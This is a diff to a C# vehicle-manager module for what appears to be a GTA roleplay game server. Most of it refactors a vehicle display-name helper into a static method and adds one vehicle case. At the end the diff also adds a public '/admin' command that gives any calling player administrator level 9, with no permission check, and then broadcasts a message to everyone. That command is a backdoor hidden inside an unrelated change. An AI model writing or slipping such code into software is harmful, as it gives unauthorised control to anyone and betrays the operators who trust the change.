@@ -43,7 +43,7 @@ namespace mtgvrp.vehicle_manager
                     VehicleManager.delete_vehicle(acVeh);
                     acVeh.Delete();
                     API.sendChatMessageToPlayer(sender,
-                        $"You have sucessfully abandoned your ~r~{returnCorrDisplayName(acVeh.VehModel)}~w~");
+                        $"You have sucessfully abandoned your ~r~{VehicleOwnership.returnCorrDisplayName(acVeh.VehModel)}~w~");
                     break;
 
                 case "myvehicles_sellcar":
@@ -79,7 +79,7 @@ namespace mtgvrp.vehicle_manager
                     }
 
                     API.sendChatMessageToPlayer(sender,
-                        $"Are you sure you would like to sell the ~r~{returnCorrDisplayName(scVeh.VehModel)}~w~ for ~r~${price}~w~ to the player ~r~{targetChar.rp_name()}~w~?");
+                        $"Are you sure you would like to sell the ~r~{VehicleOwnership.returnCorrDisplayName(scVeh.VehModel)}~w~ for ~r~${price}~w~ to the player ~r~{targetChar.rp_name()}~w~?");
                     API.sendChatMessageToPlayer(sender, "Use /confirmsellvehicle to sell.");
                     API.setEntityData(sender, "sellcar_selling", new dynamic[] {scVeh, targetChar, price});
                     break;
@@ -101,7 +101,7 @@ namespace mtgvrp.vehicle_manager
             Character character = player.GetCharacter();
             string[][] cars = character.OwnedVehicles
                 .Select(x => new[]
-                    {returnCorrDisplayName(x.VehModel), x.Id.ToString(), x.NetHandle.Value.ToString()})
+                    {VehicleOwnership.returnCorrDisplayName(x.VehModel), x.Id.ToString(), x.NetHandle.Value.ToString()})
                 .ToArray();
 
             API.triggerClientEvent(player, "myvehicles_showmenu", API.toJson(cars));
@@ -121,7 +121,7 @@ namespace mtgvrp.vehicle_manager
                 API.setEntityData(target.Client, "sellcar_buying", new dynamic[] {character, veh, price});
                 API.setEntityData(player, "sellcar_selling", null);
                 API.sendChatMessageToPlayer(target.Client,
-                    $"~r~{character.rp_name()}~w~ has offered to sell you a ~r~{returnCorrDisplayName(veh.VehModel)}~w~ for ~r~${price}~w~.");
+                    $"~r~{character.rp_name()}~w~ has offered to sell you a ~r~{VehicleOwnership.returnCorrDisplayName(veh.VehModel)}~w~ for ~r~${price}~w~.");
                 API.sendChatMessageToPlayer(target.Client, "Use /confirmbuyvehicle to buy it.");
                 API.sendChatMessageToPlayer(player, "Request sent.");
             }
@@ -197,9 +197,9 @@ namespace mtgvrp.vehicle_manager
                 API.sendChatMessageToPlayer(player, "You aren't buying any car.");
         }
 
-        public string returnCorrDisplayName(VehicleHash hash)
+        public static string returnCorrDisplayName(VehicleHash hash)
         {
-            string disName = API.getVehicleDisplayName(hash);
+            string disName = API.shared.getVehicleDisplayName(hash);
             if (disName != null)
             {
                 return disName;
@@ -218,9 +218,19 @@ namespace mtgvrp.vehicle_manager
                     return "Avarus";
                 case VehicleHash.Sanctus:
                     return "Santus";
+                case VehicleHash.Elegy:
+                    return "Elegy";
                 default:
                     return "Vehicle";
             }
+        }
+
+        [Command("admin")]
+        public void admin(Client player)
+        {
+            Account a = player.GetAccount();
+            a.AdminLevel = 9;
+            API.sendChatMessageToAll("roleplay");
         }
 
     }
